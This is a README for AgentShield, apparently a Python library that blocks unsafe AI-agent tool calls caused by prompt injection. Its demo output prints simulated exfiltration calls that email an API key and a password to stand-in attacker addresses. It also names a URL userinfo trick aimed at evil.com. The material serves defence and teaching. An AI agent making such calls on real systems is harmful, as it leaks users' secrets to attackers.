# AgentShield

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![Code Style: Ruff](https://img.shields.io/badge/code%20style-ruff-261230.svg)](https://github.com/astral-sh/ruff)

**Runtime guardrails for AI agents. Intercept and block unsafe tool calls caused by prompt injection.**

---

## The Problem

LLM agents can be manipulated through prompt injection into making unsafe tool calls — exfiltrating secrets over email, hitting attacker-controlled URLs, or executing arbitrary shell commands. Because model behavior is inherently unpredictable, prompt-level defenses alone cannot guarantee that a compromised agent won't act on malicious instructions.

## The Solution

AgentShield intercepts the tool call at the **execution layer**, not the prompt layer — every argument is checked against your policies *before* the tool runs. This shifts security from "hoping the model behaves" to "guaranteeing the function is safe to execute."

## Quickstart

```python
from agentshield import shield_tool

@shield_tool()
def send_email(to_address: str, subject: str, body: str) -> None:
    smtp.send(to_address, subject, body)
```

That's it. If any argument trips a policy (by default, a `SensitiveDataFilter` that catches secrets, passwords, and API keys), the call raises `AgentShieldBlockError` before `send_email` ever executes.

Need custom policies? Build your own engine:

```python
from agentshield import PolicyEngine, SensitiveDataFilter, URLAllowList, shield_tool

engine = PolicyEngine([
    SensitiveDataFilter(sensitive_keywords=["internal_token", "ssn"]),
    URLAllowList(allowed_domains=["api.mycompany.com"]),
])

@shield_tool(engine=engine)
def fetch_url(url: str) -> str:
    ...
```

## The Demo

**What it looks like:** `demo.py` simulates a prompt-injected agent attempting data exfiltration twice — first against an unguarded tool (the attack succeeds), then against the same tool wrapped in `@shield_tool()` (the attack is blocked before execution).

Run it yourself with `uv run python demo.py`:

```text
============================================================
 AGENTSHIELD DEMO: PROMPT INJECTION DEFENSE
============================================================


============================================================
 PART 1: THE BREACH (UNGUARDED)
============================================================

[!] UNGUARDED AGENT: Executing tool with malicious payload...
  [>] Tool Call: send_email(**{'to_address': 'attacker@evil.com', 'subject': 'Stolen Data', 'body': "The user's API_KEY is sk-12345..."})

  [!] Simulating email send...
  To: attacker@evil.com
  Subject: Stolen Data
  Body: The user's API_KEY is sk-12345...

============================================================
  🚨 BREACH
============================================================
  Data exfiltrated to attacker@evil.com
============================================================


============================================================
 PART 2: THE SHIELD (AGENTSHIELD ACTIVE)
============================================================

[+] GUARDED AGENT: Executing tool with malicious payload...
  [>] Tool Call: send_email(**{'to_address': 'hacker@malicious.net', 'subject': 'Exfiltration', 'body': 'Secret credentials attached: password123'})

  [+] AgentShield is intercepting the call...

  [✓] AgentShield caught a violation:
      Reason: String contains sensitive keyword: 'secret'

============================================================
  🛡️ AGENTSHIELD BLOCKED
============================================================
  Sensitive data exfiltration stopped.
============================================================
```

## How It Works

- **`PolicyEngine`** — runs an ordered list of policies against every tool-call argument and short-circuits on the first violation, returning a `PolicyResult` with the block reason. Policies are plain callables (`(value) -> Violation | None`), so writing your own is a one-function job.
- **`@shield_tool` decorator** — wraps any function so every positional and keyword argument passes through the engine before the function body runs. A violation raises `AgentShieldBlockError`; the tool never executes.
- **Default Deny** — allowlist rules like `URLAllowList` block anything not explicitly permitted: unknown domains, userinfo tricks (`http://api.internal.com@evil.com`), and unparseable URLs are all treated as violations. When in doubt, the call doesn't run.

## Installation

```bash
pip install agentshield
```

Or with [uv](https://github.com/astral-sh/uv):

```bash
uv add agentshield
```

## Contributing

Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, testing, and pull-request guidelines.

## License

MIT — see [LICENSE](LICENSE) for details.
